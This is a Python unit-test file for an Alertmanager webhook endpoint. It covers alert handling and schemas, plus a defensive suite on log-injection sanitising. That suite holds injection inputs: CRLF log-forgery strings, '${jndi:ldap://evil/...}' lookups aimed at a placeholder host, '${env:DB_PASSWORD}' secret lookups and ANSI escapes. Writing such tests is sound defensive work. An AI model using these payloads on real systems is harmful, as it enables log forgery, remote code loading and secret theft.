"""Unit tests for webhooks API routes.

Tests the webhook receiver endpoints:
- POST /api/webhooks/alerts - Receive Alertmanager webhook notifications

These tests follow TDD methodology - comprehensive coverage of happy paths,
error cases, and edge cases with proper mocking.
"""

from datetime import UTC, datetime
from unittest.mock import MagicMock, patch

import pytest
from fastapi import BackgroundTasks

from backend.api.routes.webhooks import receive_alertmanager_webhook
from backend.api.schemas.webhooks import (
    AlertmanagerStatus,
    AlertmanagerWebhookPayload,
    WebhookAlert,
)


class TestReceiveAlertmanagerWebhook:
    """Tests for POST /api/webhooks/alerts endpoint."""

    def _create_alert(
        self,
        alertname: str = "TestAlert",
        severity: str = "warning",
        status: AlertmanagerStatus = AlertmanagerStatus.FIRING,
        component: str = "test",
    ) -> WebhookAlert:
        """Helper to create an WebhookAlert for testing."""
        return WebhookAlert(
            status=status,
            labels={
                "alertname": alertname,
                "severity": severity,
                "component": component,
            },
            annotations={
                "summary": f"{alertname} summary",
                "description": f"{alertname} description",
            },
            startsAt=datetime(2026, 1, 17, 12, 0, 0, tzinfo=UTC),
            endsAt=None,
            generatorURL="http://prometheus:9090/graph",
            fingerprint=f"fp-{alertname.lower()}",
        )

    def _create_payload(
        self,
        alerts: list[WebhookAlert] | None = None,
        status: AlertmanagerStatus = AlertmanagerStatus.FIRING,
        receiver: str = "test-receiver",
    ) -> AlertmanagerWebhookPayload:
        """Helper to create an AlertmanagerWebhookPayload for testing."""
        if alerts is None:
            alerts = [self._create_alert()]

        return AlertmanagerWebhookPayload(
            version="4",
            groupKey='{}:{alertname="TestAlert"}',
            truncatedAlerts=0,
            status=status,
            receiver=receiver,
            groupLabels={"alertname": "TestAlert"},
            commonLabels={"alertname": "TestAlert", "severity": "warning"},
            commonAnnotations={"summary": "Test summary"},
            externalURL="http://alertmanager:9093",
            alerts=alerts,
        )

    @pytest.mark.asyncio
    async def test_receive_single_firing_alert(self) -> None:
        """Test receiving a single firing alert."""
        payload = self._create_payload()
        background_tasks = BackgroundTasks()

        with patch(
            "backend.api.routes.webhooks.EventBroadcaster", autospec=True
        ) as mock_broadcaster_cls:
            mock_broadcaster = MagicMock()
            mock_broadcaster_cls.get_instance.return_value = mock_broadcaster

            result = await receive_alertmanager_webhook(payload, background_tasks)

        assert result.status == "ok"
        assert result.received == 1
        assert result.processed == 1
        assert "1 alert(s)" in result.message

    @pytest.mark.asyncio
    async def test_receive_multiple_alerts(self) -> None:
        """Test receiving multiple alerts in one webhook."""
        alerts = [
            self._create_alert(alertname="Alert1", severity="warning"),
            self._create_alert(alertname="Alert2", severity="critical"),
            self._create_alert(alertname="Alert3", severity="info"),
        ]
        payload = self._create_payload(alerts=alerts)
        background_tasks = BackgroundTasks()

        with patch(
            "backend.api.routes.webhooks.EventBroadcaster", autospec=True
        ) as mock_broadcaster_cls:
            mock_broadcaster = MagicMock()
            mock_broadcaster_cls.get_instance.return_value = mock_broadcaster

            result = await receive_alertmanager_webhook(payload, background_tasks)

        assert result.status == "ok"
        assert result.received == 3
        assert result.processed == 3
        assert "3 alert(s)" in result.message

    @pytest.mark.asyncio
    async def test_receive_resolved_alert(self) -> None:
        """Test receiving a resolved alert."""
        alert = WebhookAlert(
            status=AlertmanagerStatus.RESOLVED,
            labels={"alertname": "TestAlert", "severity": "warning", "component": "test"},
            annotations={"summary": "Test resolved"},
            startsAt=datetime(2026, 1, 17, 12, 0, 0, tzinfo=UTC),
            endsAt=datetime(2026, 1, 17, 12, 30, 0, tzinfo=UTC),
            fingerprint="fp-resolved",
        )
        payload = self._create_payload(alerts=[alert], status=AlertmanagerStatus.RESOLVED)
        background_tasks = BackgroundTasks()

        with patch(
            "backend.api.routes.webhooks.EventBroadcaster", autospec=True
        ) as mock_broadcaster_cls:
            mock_broadcaster = MagicMock()
            mock_broadcaster_cls.get_instance.return_value = mock_broadcaster

            result = await receive_alertmanager_webhook(payload, background_tasks)

        assert result.status == "ok"
        assert result.received == 1
        assert result.processed == 1

    @pytest.mark.asyncio
    async def test_receive_critical_alert_logs_error(self) -> None:
        """Test that critical firing alerts are logged at error level."""
        alert = self._create_alert(alertname="CriticalAlert", severity="critical")
        payload = self._create_payload(alerts=[alert])
        background_tasks = BackgroundTasks()

        with (
            patch(
                "backend.api.routes.webhooks.EventBroadcaster", autospec=True
            ) as mock_broadcaster_cls,
            patch("backend.api.routes.webhooks.logger", autospec=True) as mock_logger,
        ):
            mock_broadcaster = MagicMock()
            mock_broadcaster_cls.get_instance.return_value = mock_broadcaster

            result = await receive_alertmanager_webhook(payload, background_tasks)

        assert result.status == "ok"
        # Verify error logging for critical alerts
        mock_logger.error.assert_called()
        call_args = str(mock_logger.error.call_args)
        assert "CriticalAlert" in call_args
        assert "critical" in call_args

    @pytest.mark.asyncio
    async def test_receive_warning_alert_logs_warning(self) -> None:
        """Test that warning firing alerts are logged at warning level."""
        alert = self._create_alert(alertname="WarningAlert", severity="warning")
        payload = self._create_payload(alerts=[alert])
        background_tasks = BackgroundTasks()

        with (
            patch(
                "backend.api.routes.webhooks.EventBroadcaster", autospec=True
            ) as mock_broadcaster_cls,
            patch("backend.api.routes.webhooks.logger", autospec=True) as mock_logger,
        ):
            mock_broadcaster = MagicMock()
            mock_broadcaster_cls.get_instance.return_value = mock_broadcaster

            result = await receive_alertmanager_webhook(payload, background_tasks)

        assert result.status == "ok"
        mock_logger.warning.assert_called()

    @pytest.mark.asyncio
    async def test_receive_info_alert_logs_info(self) -> None:
        """Test that info firing alerts are logged at info level."""
        alert = self._create_alert(alertname="InfoAlert", severity="info")
        payload = self._create_payload(alerts=[alert])
        background_tasks = BackgroundTasks()

        with (
            patch(
                "backend.api.routes.webhooks.EventBroadcaster", autospec=True
            ) as mock_broadcaster_cls,
            patch("backend.api.routes.webhooks.logger", autospec=True) as mock_logger,
        ):
            mock_broadcaster = MagicMock()
            mock_broadcaster_cls.get_instance.return_value = mock_broadcaster

            result = await receive_alertmanager_webhook(payload, background_tasks)

        assert result.status == "ok"
        mock_logger.info.assert_called()

    @pytest.mark.asyncio
    async def test_broadcaster_not_initialized_does_not_fail(self) -> None:
        """Test that webhook succeeds even if WebSocket broadcaster is not ready."""
        payload = self._create_payload()
        background_tasks = BackgroundTasks()

        with patch(
            "backend.api.routes.webhooks.EventBroadcaster", autospec=True
        ) as mock_broadcaster_cls:
            mock_broadcaster_cls.get_instance.side_effect = RuntimeError(
                "Broadcaster not initialized"
            )

            result = await receive_alertmanager_webhook(payload, background_tasks)

        # Should still succeed - broadcast failure is non-fatal
        assert result.status == "ok"
        assert result.received == 1
        assert result.processed == 1

    @pytest.mark.asyncio
    async def test_response_includes_receiver_name(self) -> None:
        """Test that response message includes the receiver name."""
        payload = self._create_payload(receiver="critical-receiver")
        background_tasks = BackgroundTasks()

        with patch(
            "backend.api.routes.webhooks.EventBroadcaster", autospec=True
        ) as mock_broadcaster_cls:
            mock_broadcaster = MagicMock()
            mock_broadcaster_cls.get_instance.return_value = mock_broadcaster

            result = await receive_alertmanager_webhook(payload, background_tasks)

        assert "critical-receiver" in result.message

    @pytest.mark.asyncio
    async def test_empty_alerts_list(self) -> None:
        """Test handling of webhook with empty alerts list."""
        payload = self._create_payload(alerts=[])
        background_tasks = BackgroundTasks()

        with patch(
            "backend.api.routes.webhooks.EventBroadcaster", autospec=True
        ) as mock_broadcaster_cls:
            mock_broadcaster = MagicMock()
            mock_broadcaster_cls.get_instance.return_value = mock_broadcaster

            result = await receive_alertmanager_webhook(payload, background_tasks)

        assert result.status == "ok"
        assert result.received == 0
        assert result.processed == 0

    @pytest.mark.asyncio
    async def test_alert_with_missing_optional_labels(self) -> None:
        """Test handling of alert with missing optional labels."""
        alert = WebhookAlert(
            status=AlertmanagerStatus.FIRING,
            labels={"alertname": "MinimalAlert"},  # Missing severity and component
            annotations={},  # Missing summary and description
            startsAt=datetime(2026, 1, 17, 12, 0, 0, tzinfo=UTC),
            fingerprint="fp-minimal",
        )
        payload = self._create_payload(alerts=[alert])
        background_tasks = BackgroundTasks()

        with patch(
            "backend.api.routes.webhooks.EventBroadcaster", autospec=True
        ) as mock_broadcaster_cls:
            mock_broadcaster = MagicMock()
            mock_broadcaster_cls.get_instance.return_value = mock_broadcaster

            result = await receive_alertmanager_webhook(payload, background_tasks)

        assert result.status == "ok"
        assert result.received == 1
        assert result.processed == 1


class TestAlertmanagerLogSanitisation:
    """Pins CWE-117 log forgery shut on POST /api/webhooks/alerts (UR-48).

    Every value this route interpolates comes from an unconstrained
    ``dict[str, str]`` (``AlertmanagerAlert.labels`` / ``.annotations``), and a
    ``monitoring``-scoped key can post it, so each interpolated value must pass
    through ``sanitize_log_value`` (CWE-117; the file's house pattern). The
    per-message marker counts are what make each field's own sanitising
    observable: sanitising one field and leaving another raw changes the count.
    """

    def _alert(
        self,
        status: AlertmanagerStatus,
        labels: dict[str, str],
        annotations: dict[str, str],
    ) -> WebhookAlert:
        return WebhookAlert(
            status=status,
            labels=labels,
            annotations=annotations,
            startsAt=datetime(2026, 1, 17, 12, 0, 0, tzinfo=UTC),
            endsAt=None,
            fingerprint="fp-sanitize",
        )

    def _payload(self, alert: WebhookAlert) -> AlertmanagerWebhookPayload:
        return AlertmanagerWebhookPayload(
            version="4",
            groupKey='{}:{alertname="forged"}',
            truncatedAlerts=0,
            status=alert.status,
            receiver="test-receiver",
            groupLabels={},
            commonLabels={},
            commonAnnotations={},
            externalURL="http://alertmanager:9093",
            alerts=[alert],
        )

    def _logged(self, mock_logger: MagicMock) -> str:
        """The single log message this handler emitted, as the logger saw it."""
        assert mock_logger.error.call_count + mock_logger.warning.call_count == 1
        call = mock_logger.error.call_args or mock_logger.warning.call_args
        return call.args[0]

    @pytest.mark.asyncio
    async def test_firing_line_sanitizes_labels_and_annotations(self) -> None:
        """A newline or ``${…}`` in any interpolated field cannot forge a line."""
        alert = self._alert(
            AlertmanagerStatus.FIRING,
            {
                "alertname": "GpuMem${env:DB_PASSWORD}\r\nFORGED-ALERT-LINE",
                "severity": "critical",
                "component": "gpu${jndi:ldap://evil/x}\rc2",
            },
            {"description": "above 90%\nfor 5 minutes${lower:pwn}"},
        )

        with (
            patch("backend.api.routes.webhooks.EventBroadcaster", autospec=True),
            patch("backend.api.routes.webhooks.logger", autospec=True) as mock_logger,
        ):
            result = await receive_alertmanager_webhook(self._payload(alert), BackgroundTasks())

        assert result.status == "ok"
        message = self._logged(mock_logger)
        # CWE-117: the forged second line cannot survive into the logged message.
        assert "\n" not in message
        assert "\r" not in message
        assert "${" not in message
        # One marker per sanitised field (alertname, component, description), so a
        # cure that wraps only some of them cannot pass.
        assert message.count("[EXPRESSION_REMOVED]") == 3
        # The alert is still identifiable: sanitising is not redacting.
        assert "FORGED-ALERT-LINE" in message
        assert message.startswith("[ALERT FIRING] ")

    @pytest.mark.asyncio
    async def test_firing_line_sanitizes_the_severity_field(self) -> None:
        """``severity`` is interpolated too, so it is sanitised too.

        Its raw value still chooses the level: this payload is not ``critical``
        verbatim, so it lands at INFO. The cure sanitises log *content*, not
        routing — routing on the sanitised value would escalate a crafted
        ``critical\\x1b[0m`` to ERROR, a second behaviour change this defect
        did not ask for. Pinned by the ESC absence, not a marker count:
        ``sanitize_log_value`` deletes ANSI sequences rather than marking them.
        """
        alert = self._alert(
            AlertmanagerStatus.FIRING,
            {
                "alertname": "GpuMem",
                "severity": "critical\u001b[31m\nFORGED",
                "component": "gpu",
            },
            {"description": "plain description"},
        )

        with (
            patch("backend.api.routes.webhooks.EventBroadcaster", autospec=True),
            patch("backend.api.routes.webhooks.logger", autospec=True) as mock_logger,
        ):
            result = await receive_alertmanager_webhook(self._payload(alert), BackgroundTasks())

        assert result.status == "ok"
        mock_logger.error.assert_not_called()
        assert mock_logger.info.call_count == 1
        message = mock_logger.info.call_args.args[0]
        assert "\n" not in message
        assert "\x1b" not in message
        assert "(critical FORGED)" in message

    @pytest.mark.asyncio
    async def test_routing_reads_the_raw_severity_not_the_sanitized_one(self) -> None:
        """Level selection must keep reading the raw ``severity``.

        ``sanitize_log_value`` deletes ANSI sequences, so it can *manufacture*
        the routing keyword: a crafted ``crit\\x1b[0mical`` sanitises to exactly
        ``"critical"`` (measured: ``sanitize_log_value('crit\\x1b[0mical') ==
        'critical'``). If level selection ever moved onto the sanitised value,
        this payload would escalate itself to ERROR. It must not, so this asserts
        ERROR was *not* taken - the only shape where raw and sanitised routing
        disagree, which is what makes it a pin rather than a restatement.
        """
        alert = self._alert(
            AlertmanagerStatus.FIRING,
            {
                "alertname": "GpuMem",
                "severity": "crit\x1b[0mical",
                "component": "gpu",
            },
            {"description": "GPU memory usage is above 90%"},
        )

        with (
            patch("backend.api.routes.webhooks.EventBroadcaster", autospec=True),
            patch("backend.api.routes.webhooks.logger", autospec=True) as mock_logger,
        ):
            result = await receive_alertmanager_webhook(self._payload(alert), BackgroundTasks())

        assert result.status == "ok"
        mock_logger.error.assert_not_called()
        assert mock_logger.info.call_count == 1
        # The ESC is gone from the text that was logged, ...
        message = mock_logger.info.call_args.args[0]
        assert "\x1b" not in message
        # ... and what remains happens to read as "critical".
        assert "(critical)" in message

    @pytest.mark.asyncio
    async def test_resolved_line_sanitizes_every_interpolated_field(self) -> None:
        """The RESOLVED branch interpolates the same fields and is open too."""
        alert = self._alert(
            AlertmanagerStatus.RESOLVED,
            {
                "alertname": "GpuMem${env:KEY}\rforged",
                "severity": "warning\u001b[0m\nforged",
                "component": "gpu\x00${jndi:ldap://evil/y}",
            },
            {"description": "unused for this branch"},
        )

        with (
            patch("backend.api.routes.webhooks.EventBroadcaster", autospec=True),
            patch("backend.api.routes.webhooks.logger", autospec=True) as mock_logger,
        ):
            result = await receive_alertmanager_webhook(self._payload(alert), BackgroundTasks())

        assert result.status == "ok"
        assert mock_logger.info.call_count == 1
        message = mock_logger.info.call_args.args[0]
        assert "\n" not in message
        assert "\r" not in message
        assert "\x00" not in message
        assert "\x1b" not in message
        assert "${" not in message
        # Two markers: one in ``alertname``, one in ``component``. ``severity``
        # carries only an ANSI sequence, which the wrapper deletes rather than
        # marks, and ``description`` is not interpolated on this branch.
        assert message.count("[EXPRESSION_REMOVED]") == 2
        # startsAt is a parsed datetime, so it needs no sanitising and still shows.
        assert "resolved after firing since" in message

    @pytest.mark.asyncio
    async def test_well_formed_payload_message_text_is_unchanged(self) -> None:
        """Done-when 2: for a value that needs no sanitising, the line is identical.

        Pinned as exact text, not "contains", so the cure cannot quietly
        re-quote, re-order or drop a field.
        """
        alert = self._alert(
            AlertmanagerStatus.FIRING,
            {"alertname": "HSIGPUMemoryHigh", "severity": "warning", "component": "gpu"},
            {"description": "GPU memory usage is above 90% for 5 minutes"},
        )

        with (
            patch("backend.api.routes.webhooks.EventBroadcaster", autospec=True),
            patch("backend.api.routes.webhooks.logger", autospec=True) as mock_logger,
        ):
            result = await receive_alertmanager_webhook(self._payload(alert), BackgroundTasks())

        assert result.status == "ok"
        mock_logger.warning.assert_called_once_with(
            "[ALERT FIRING] HSIGPUMemoryHigh (warning) - component=gpu: "
            "GPU memory usage is above 90% for 5 minutes"
        )

    @pytest.mark.asyncio
    async def test_summary_is_still_the_fallback_when_description_is_absent(self) -> None:
        """The ``description`` -> ``summary`` fallback is pre-existing behaviour.

        Alertmanager sends one, the other, or both; the handler prefers
        ``description`` and falls back to ``summary``. The sanitising cure must
        not disturb that choice, and nothing else here observes it - a cure that
        dropped the fallback would log an empty message for every summary-only
        alert and keep every other test green.
        """
        alert = self._alert(
            AlertmanagerStatus.FIRING,
            {"alertname": "HSIGPUMemoryHigh", "severity": "warning", "component": "gpu"},
            {"summary": "GPU memory usage is high"},  # no description key
        )

        with (
            patch("backend.api.routes.webhooks.EventBroadcaster", autospec=True),
            patch("backend.api.routes.webhooks.logger", autospec=True) as mock_logger,
        ):
            result = await receive_alertmanager_webhook(self._payload(alert), BackgroundTasks())

        assert result.status == "ok"
        mock_logger.warning.assert_called_once_with(
            "[ALERT FIRING] HSIGPUMemoryHigh (warning) - component=gpu: GPU memory usage is high"
        )


class TestAlertmanagerSchemas:
    """Tests for Alertmanager webhook Pydantic schemas."""

    def test_alert_status_enum_values(self) -> None:
        """Test AlertmanagerStatus enum values."""
        assert AlertmanagerStatus.FIRING == "firing"
        assert AlertmanagerStatus.RESOLVED == "resolved"

    def test_alertmanager_alert_required_fields(self) -> None:
        """Test WebhookAlert with required fields only."""
        alert = WebhookAlert(
            status=AlertmanagerStatus.FIRING,
            startsAt=datetime(2026, 1, 17, 12, 0, 0, tzinfo=UTC),
            fingerprint="test-fp",
        )
        assert alert.status == AlertmanagerStatus.FIRING
        assert alert.fingerprint == "test-fp"
        assert alert.labels == {}
        assert alert.annotations == {}

    def test_alertmanager_alert_all_fields(self) -> None:
        """Test WebhookAlert with all fields."""
        alert = WebhookAlert(
            status=AlertmanagerStatus.RESOLVED,
            labels={"alertname": "Test", "severity": "critical"},
            annotations={"summary": "Test summary", "description": "Test desc"},
            startsAt=datetime(2026, 1, 17, 12, 0, 0, tzinfo=UTC),
            endsAt=datetime(2026, 1, 17, 13, 0, 0, tzinfo=UTC),
            generatorURL="http://prometheus:9090/graph",
            fingerprint="full-fp",
        )
        assert alert.status == AlertmanagerStatus.RESOLVED
        assert alert.labels["alertname"] == "Test"
        assert alert.labels["severity"] == "critical"
        assert alert.annotations["summary"] == "Test summary"
        assert alert.endsAt is not None
        assert alert.generatorURL == "http://prometheus:9090/graph"

    def test_alertmanager_webhook_payload(self) -> None:
        """Test AlertmanagerWebhookPayload with all fields."""
        alert = WebhookAlert(
            status=AlertmanagerStatus.FIRING,
            startsAt=datetime(2026, 1, 17, 12, 0, 0, tzinfo=UTC),
            fingerprint="test-fp",
        )
        payload = AlertmanagerWebhookPayload(
            version="4",
            groupKey="test-group",
            status=AlertmanagerStatus.FIRING,
            receiver="test-receiver",
            alerts=[alert],
        )
        assert payload.version == "4"
        assert payload.groupKey == "test-group"
        assert payload.receiver == "test-receiver"
        assert len(payload.alerts) == 1
        assert payload.truncatedAlerts == 0
